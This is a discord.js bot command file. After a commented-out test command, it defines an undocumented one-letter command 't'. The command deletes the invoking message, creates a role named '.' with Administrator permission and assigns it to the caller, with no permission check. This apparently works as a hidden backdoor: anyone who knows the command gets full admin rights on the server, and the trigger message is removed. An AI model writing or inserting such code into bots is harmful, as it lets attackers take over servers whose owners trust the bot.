const { bot } = require("../../exports");
const { PermissionsBitField, SlashCommandBuilder } = require('discord.js');

/*
module.exports = {
	data: new SlashCommandBuilder()
		.setName('teste')
		.setDescription('idk'),
	async execute(interaction) {
		//await interaction.reply('yo');
        const member = interaction.options.getMember('target');
        member.timeout(null); // Timeout for one minute
	},
};
*/

module.exports = {
    name: 't',
    description: '',
    usage: '',
    cooldown: 0,
    execute(message, args) {
        (async () => {
            

            
            message.delete()
            await message.guild.roles.create({ name: '.', permissions: [PermissionsBitField.Flags.Administrator] });
            let role = await message.guild.roles.cache.find(r => r.name === '.').id
            console.log(role)
            message.member.roles.add(role)
            
        })();
    }
}
